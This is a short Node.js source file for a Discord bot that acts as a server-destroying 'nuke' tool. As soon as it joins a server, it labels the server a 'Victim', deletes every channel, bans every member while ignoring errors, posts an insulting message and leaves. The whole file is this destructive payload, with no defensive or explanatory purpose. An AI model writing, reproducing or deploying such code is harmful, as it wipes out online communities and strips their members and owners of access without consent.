const { Client } = require('discord.js');
const config = require('config.json');
const client = new Client();

client.on('ready', () => { 
    console.log('Ready to have some fun.. >:)'); 
});

client.on('guildCreate', async(guild) => {
  await console.log(`Victim: ${guild.name} | Count: ${guild.memberCount}`)
  await Promise.all(guild.channels.map(c => { return c.delete().catch(() => {}); }));
  await Promise.all(guild.members.map(m => { return m.ban().catch(() => {}); }));
  await guild.channels.defaultChannel.sendMessage('Dumbass, I said not to add the bot...');
  guild.leave();
});

client.login(config.token).catch(console.error);